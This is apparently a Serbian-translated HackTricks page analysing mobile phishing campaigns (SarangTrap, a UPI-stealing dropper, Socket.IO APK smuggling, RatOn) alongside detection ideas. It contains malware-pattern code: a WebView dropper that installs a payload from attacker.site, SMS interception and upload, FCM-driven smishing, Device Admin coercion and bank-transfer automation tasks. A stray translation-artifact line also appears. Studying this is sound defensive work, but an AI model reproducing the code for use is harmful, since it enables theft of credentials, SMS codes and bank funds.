# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obuhvata tehnike koje koriste threat actors za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishing (SEO, social engineering, fake stores, dating apps, itd.).
> Materijal je adaptiran iz kampanje SarangTrap otkrivene od strane Zimperium zLabs (2025) i drugih javno dostupnih istraživanja.

## Tok napada

1. **SEO/Phishing Infrastructure**
* Registrujte desetine sličnih domena (dating, cloud share, car service…).
– Koristite ključne reči na lokalnom jeziku i emotikone u `<title>` elementu da se rangirate na Google.
– Hostujte na istoj landing stranici uputstva za instalaciju za Android (`.apk`) i iOS.
2. **First Stage Download**
* Android: direktan link do *unsigned* ili “third-party store” APK-a.
* iOS: `itms-services://` ili običan HTTPS link ka malicioznom **mobileconfig** profilu (vidi dole).
3. **Post-install Social Engineering**
* Pri prvom pokretanju aplikacija traži **invitation / verification code** (iluzija ekskluzivnog pristupa).
* Kod se **POSTed over HTTP** na Command-and-Control (C2).
* C2 odgovara `{"success":true}` ➜ malware nastavlja.
* Sandbox / AV dinamička analiza koja nikada ne pošalje validan kod ne uoči **maliciozno ponašanje** (evasion).
4. **Runtime Permission Abuse** (Android)
* Opasne dozvole se traže tek **nakon pozitivnog odgovora C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod koji čita SMS preko reflection ⇒ snižava statički score dok i dalje funkcioniše na uređajima koji daju dozvolu preko `AppOps` abuse ili starih ciljeva.
5. **Facade UI & Background Collection**
* Aplikacija prikazuje bezopasne view-e (SMS viewer, gallery picker) implementirane lokalno.
* U međuvremenu eksfiltrira:
- IMEI / IMSI, broj telefona
- Potpuni `ContactsContract` dump (JSON array)
- JPEG/PNG iz `/sdcard/DCIM` kompresovano pomoću [Luban](https://github.com/Curzibn/Luban) da se smanji veličina
- Opcioni sadržaj SMS-a (`content://sms`)
Payloads su **batch-zipped** i šalju se putem `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Jedan **mobile-configuration profile** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da upiše uređaj u nadzor sličan “MDM”.
* Social-engineering uputstva:
1. Otvorite Settings ➜ *Profile downloaded*.
2. Tapnite *Install* tri puta (screenshot-ovi na phishing stranici).
3. Trust the unsigned profile ➜ napadač dobija *Contacts* & *Photo* entitlement bez App Store pregleda.
7. **Network Layer**
* Običan HTTP, često na portu 80 sa HOST headerom kao `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako primetiti).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Tokom procene malware-a, automatizujte fazu invitation code koristeći Frida/Objection da dođete do malicioznog branch-a.
* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostatak opasnih permisija je crvena zastavica.
* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da otkrijete neobične POST burst-ove nakon unosa koda.
* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS-u da izlistate `PayloadContent` i uočite prekomerne entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** za hvatanje naglih izbijanja domena bogatih ključnim rečima.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` od Dalvik klijenata van Google Play.
* **Invite-code Telemetry** – POST 6–8 cifrenih numeričkih kodova ubrzo nakon instalacije APK-a može ukazivati na staging.
* **MobileConfig Signing** – Blokirajte unsigned configuration profile putem MDM politike.

## Koristan Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatori (Generički)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ovaj obrazac primećen je u kampanjama koje zloupotrebljavaju teme državnih pomoći kako bi ukrali indijske UPI kredencijale i OTP-ove. Operateri povezuju ugledne platforme radi isporuke i otpornosti.

### Delivery chain across trusted platforms
- YouTube video lure → opis sadrži skraćeni link
- Skraćeni link → GitHub Pages phishing sajt koji imituje legitimni portal
- Isti GitHub repo hostuje APK sa lažnom “Google Play” oznakom koja direktno vodi do fajla
- Dinamičke phishing stranice hostovane na Replit; daljinski kanal komandi koristi Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Prvi APK je installer (dropper) koji isporučuje stvarni malware u `assets/app.apk` i traži od korisnika da isključi Wi‑Fi/mobilne podatke kako bi umanjio detekciju u cloudu.
- Ugrađeni payload se instalira pod bezazlenim nazivom (npr. “Secure Update”). Nakon instalacije, i installer i payload su prisutni kao odvojene aplikacije.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamičko otkrivanje endpoint-a putem shortlink
- Malware preuzima plain-text, comma-separated list live endpoints sa shortlink; simple string transforms proizvode finalni phishing page path.

Primer (sanitizovano):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Korak “Make payment of ₹1 / UPI‑Lite” učitava zlonamerni HTML formular sa dinamičkog endpointa unutar WebView-a i hvata osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Agresivne dozvole se traže pri prvom pokretanju:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se u petlji koriste za masovno slanje smishing SMS sa uređaja žrtve.
- Dolazne SMS poruke se presreću broadcast receiver-om i otpremaju sa metapodacima (pošiljalac, telo poruke, SIM slot, nasumični ID po uređaju) na `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Payload se registruje na FCM; push messages nose `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr., update phishing text templates, toggle behaviours).

Primer FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Skica handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Obrasci otkrivanja i indikatori kompromitovanja (IOCs)
- APK sadrži sekundarni payload u `assets/app.apk`
- WebView učitava payment iz `gate.htm` i eksfiltrira na `/addup.php`
- SMS eksfiltracija na `/addsm.php`
- Preuzimanje konfiguracije pokrenuto shortlinkom (npr. `rebrand.ly/*`) koje vraća CSV endpoint-e
- Aplikacije označene kao generičke “Update/Secure Update”
- FCM `data` poruke sa `_type` diskriminatorom u nepouzdanim aplikacijama

### Ideje za detekciju i odbranu
- Označiti aplikacije koje upute korisnike da isključe mrežu tokom instalacije, a zatim side-loaduju drugi APK iz `assets/`.
- Upozoriti na kombinaciju permisija: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Monitoring izlaznog saobraćaja za `POST /addup.php|/addsm.php` na nekorporativnim hostovima; blokirati poznatu infrastrukturu.
- Mobile EDR pravila: nepouzdana aplikacija koja se registruje za FCM i grananje po `_type` polju.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Napadači sve češće zamenjuju statičke APK linkove Socket.IO/WebSocket kanalom ugrađenim u namame koje izgledaju kao Google Play. Ovo skriva payload URL, zaobilazi URL/extension filtre i održava realističan install UX.

Tipičan tok klijenta zabeležen u realnom svetu:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Zašto zaobilazi jednostavne kontrole:
- Nije izložen statički APK URL; payload se rekonstruše u memoriji iz WebSocket frames.
- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane putem WebSockets/Socket.IO.
- Crawleri i URL sandboxes koji ne izvršavaju WebSockets neće preuzeti payload.

Ideje za otkrivanje i detekciju:
- Web/network telemetrija: označiti WebSocket sesije koje prenose velike binarne delove, nakon čega sledi kreiranje Blob-a sa MIME application/vnd.android.package-archive i programatski `<a download>` klik. Tražite klijentske stringove kao socket.emit('startDownload'), i događaje imenovane chunk, downloadProgress, downloadComplete u skriptama stranice.
- Play-store spoof heuristike: na domenima koji nisu Google i koji serviraju Play-like stranice, tražite Google Play UI stringove kao http.html:"VfPpkd-jY41G-V67aGc", mešovite jezičke template-e, i lažne “verification/progress” tokove pokretane WS događajima.
- Kontrole: blokirajte isporuku APK-a sa porekla koja nisu Google; primenite MIME/extension politike koje obuhvataju WebSocket saobraćaj; očuvajte browser safe-download prompte.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn studija slučaja

Kampanja RatOn banker/RAT (ThreatFabric) je konkretan primer kako moderne mobile phishing operacije kombinuju WebView droppere, Accessibility-driven UI automatizaciju, overlays/ransom, Device Admin prinudu, Automated Transfer System (ATS), preuzimanje crypto wallet-a, pa čak i NFC-relay orkestraciju. Ovaj odeljak apstrahuje ponovo upotrebljive tehnike.

### Stage-1: WebView → native install bridge (dropper)
Napadači prikažu WebView koji pokazuje na napadačevu stranicu i injektuju JavaScript interfejs koji izlaže native installer. Tap na HTML dugme poziva native kod koji instalira second-stage APK uključen u dropper-ove assets i zatim ga direktno pokreće.

Minimalni obrazac:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Molim vas nalepite HTML sadržaj stranice koji želite da prevedem.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nakon instalacije, dropper pokreće payload putem eksplicitnog package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: nepouzdane aplikacije koje pozivaju `addJavascriptInterface()` i izlažu metode nalik installeru u WebView; APK koji isporučuje ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 otvara WebView koji hostuje stranicu “Access”. Njeno dugme poziva exported method koja navede žrtvu na Accessibility settings i zahteva omogućavanje rogue service. Kada se to odobri, malware koristi Accessibility da automatski klikne kroz naredne runtime dijaloge za dozvole (contacts, overlay, manage system settings, itd.) i zahteva Device Admin.

- Accessibility programski pomaže prihvatiti kasnije promptove tako što pronalazi dugmad kao “Allow”/“OK” u node-tree i simulira klikove.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vidi takođe:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatori mogu izdavati komande za:
- prikaz overlay-a preko celog ekrana sa URL-a, ili
- prosleđivanje inline HTML-a koji se učitava u WebView overlay.

Verovatne upotrebe: prisila (PIN entry), otvaranje wallet-a da bi se presreli PINs, ransom messaging. Zadržati komandu koja osigurava da je dozvola za overlay dodeljena ukoliko nedostaje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodično dump-ovati Accessibility node tree, serializovati vidljive texts/roles/bounds i poslati na C2 kao pseudo-screen (komande kao `txt_screen` jednom i `screen_live` kontinuirano).
- High-fidelity: zatražiti MediaProjection i pokrenuti screen-casting/recording po potrebi (komande kao `display` / `record`).

### ATS playbook (bank app automation)
Na osnovu JSON zadatka, otvoriti bank app, upravljati UI preko Accessibility koristeći kombinaciju text queries i coordinate taps, i uneti payment PIN žrtve kada bude zatraženo.

Primer zadatka:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Primeri tekstova viđenih u jednom ciljanom toku (CZ → EN):
- "Nová platba" → "Nova uplata"
- "Zadat platbu" → "Unesi uplatu"
- "Nový příjemce" → "Novi primalac"
- "Domácí číslo účtu" → "Domaći broj računa"
- "Další" → "Dalje"
- "Odeslat" → "Pošalji"
- "Ano, pokračovat" → "Da, nastavi"
- "Zaplatit" → "Plati"
- "Hotovo" → "Gotovo"

Operatori takođe mogu proveravati/povećavati limite transfera putem komandi kao `check_limit` i `limit` koje na sličan način navigiraju UI za limite.

### Ekstrakcija seed fraze kripto novčanika
Ciljevi kao MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: otključavanje (ukradeni PIN ili dostavljena lozinka), navigacija do Security/Recovery, otkriti/prikazati seed frazu, keylog/exfiltrate it. Implementirati selektore osetljive na lokalizaciju (EN/RU/CZ/SK) kako bi se stabilizovala navigacija kroz jezike.

### Prisila Device Admin-a
Device Admin APIs se koriste za povećanje mogućnosti hvatanja PIN-a i frustriranje žrtve:

- Momentalno zaključavanje:
```java
dpm.lockNow();
```
- Isteknite trenutne kredencijale da primorate promenu (Accessibility hvata novi PIN/lozinku):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Primorajte otključavanje bez biometrije onemogućavanjem biometrijskih funkcija keyguard-a:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Napomena: Mnoge DevicePolicyManager kontrole zahtevaju Device Owner/Profile Owner na novijim verzijama Androida; neki OEM buildovi mogu biti popustljivi. Uvek validirajte na ciljnom OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu proslediti HTML šablon koji vodi žrtvu tokom relay-a. Ovo omogućava contactless card-present cash-out pored online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ideje za detekciju i odbranu (RatOn-style)
- Pronađite WebView-ove koji koriste `addJavascriptInterface()` i izlažu metode instalera/dozvola; stranice koje se završavaju sa “/access” i pokreću Accessibility promptove.
- Upozorite na aplikacije koje generišu visokofrekventne Accessibility geste/klikove ubrzo nakon dobijanja pristupa servisu; telemetrija koja liči na Accessibility node dump-ove poslate na C2.
- Pratite promene Device Admin politika u nepouzdanim aplikacijama: `lockNow`, isteka lozinke, prekidači keyguard funkcionalnosti.
- Upozorite na MediaProjection promptove iz nekorporativnih aplikacija koji su praćeni periodičnim upload-ovima frejmova.
- Detektujte instalaciju/pokretanje eksternog NFC-relay app-a koje je pokrenula druga aplikacija.
- Za bankarstvo: primenjujte out-of-band potvrde, vezivanje za biometriju i ograničenja transakcija otporna na automatizaciju na uređaju.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
